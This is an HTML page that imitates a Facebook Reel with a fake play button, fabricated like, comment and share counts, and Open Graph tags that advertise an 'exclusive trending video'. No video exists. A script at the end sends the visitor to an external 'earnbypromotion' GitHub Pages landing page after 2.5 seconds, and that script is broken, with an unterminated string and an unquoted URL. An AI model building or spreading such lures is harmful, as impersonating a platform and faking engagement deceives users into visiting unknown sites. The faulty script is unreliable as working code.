<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Trending Video - Facebook Reel</title>

    <!-- Facebook Open Graph (OG) Tags -->
    <meta property="og:title" content="🔥 Watch Exclusive Trending Video Now!" />
    <meta property="og:description" content="1.2M Views • Watch full HD video on Facebook Reel" />
    <meta property="og:image" content="https://cdn.phototourl.com/free/2026-09-22-550b172a-e7f8-45c7-9305-995e0f3fbe4e.jpg" />
    <meta property="og:type" content="video.other" />
    <meta property="og:url" content="https://cdn.phototourl.com/free/2026-09-22-550b172a-e7f8-45c7-9305-995e0f3fbe4e.jpg" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000;
            color: #fff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .reel-container {
            position: relative;
            width: 100%;
            max-width: 420px;
            height: 100vh;
            background: #111;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        /* Fake Video Background Thumbnail */
        .video-placeholder {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.85;
            filter: brightness(0.9);
        }

        /* Facebook Top Header Bar */
        .top-bar {
            position: absolute;
            top: 15px;
            left: 15px;
            right: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 10;
        }

        .fb-logo {
            font-weight: bold;
            font-size: 20px;
            color: #1877f2;
            background: rgba(0,0,0,0.5);
            padding: 4px 10px;
            border-radius: 6px;
        }

        /* Right Side Reel Icons (Likes, Comments, Share) */
        .right-sidebar {
            position: absolute;
            right: 15px;
            bottom: 80px;
            display: flex;
            flex-direction: column;
            gap: 20px;
            align-items: center;
            z-index: 10;
        }

        .icon-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            font-size: 12px;
            color: #fff;
            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
        }

        .icon-btn svg {
            width: 28px;
            height: 28px;
            fill: #fff;
            filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.6));
        }

        /* Bottom Info Section */
        .bottom-info {
            position: absolute;
            bottom: 25px;
            left: 15px;
            right: 70px;
            z-index: 10;
        }

        .user-profile {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 8px;
        }

        .avatar {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: #1877f2;
            border: 2px solid #fff;
        }

        .username {
            font-weight: 600;
            font-size: 14px;
        }

        .caption {
            font-size: 13px;
            opacity: 0.9;
            line-height: 1.3;
        }

        /* Center Play Icon Animation */
        .loader-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 20;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
        }

        .play-icon {
            width: 65px;
            height: 65px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            border: 2px solid rgba(255, 255, 255, 0.8);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.08); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>

    <div class="reel-container">
        <!-- Reel Background Image -->
        <img src="https://cdn.phototourl.com/free/2026-09-22-550b172a-e7f8-45c7-9305-995e0f3fbe4e.jpg" alt="Facebook Reel Video" class="video-placeholder">

        <!-- Top Facebook Bar -->
        <div class="top-bar">
            <span class="fb-logo">facebook</span>
        </div>

        <!-- Animated Center Play Button -->
        <div class="loader-overlay">
            <div class="play-icon">
                <svg viewBox="0 0 24 24" width="32" height="32" fill="#ffffff">
                    <path d="M8 5v14l11-7z"/>
                </svg>
            </div>
        </div>

        <!-- Right Side Icons -->
        <div class="right-sidebar">
            <div class="icon-btn">
                <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
                <span>312.4K</span>
            </div>
            <div class="icon-btn">
                <svg viewBox="0 0 24 24"><path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z"/></svg>
                <span>4.8K</span>
            </div>
            <div class="icon-btn">
                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
                <span>18.2K</span>
            </div>
        </div>

        <!-- Bottom User Details -->
        <div class="bottom-info">
            <div class="user-profile">
                <div class="avatar"></div>
                <span class="username">Trending Reels Media</span>
            </div>
            <p class="caption">Loading full HD video stream player...</p>
        </div>
    </div>

        <script>
        // Set exact GitHub Pages link to landing page
        const LANDING_PAGE_URL = "https://earnbypromotion.github.io/index/landing.html
";

        // Auto Redirect after 2.5 seconds
        setTimeout(() => {
            window.location.href = https://earnbypromotion.github.io/index/landing.html
;
        }, 2500);
        </script>
  
</body>
</html>
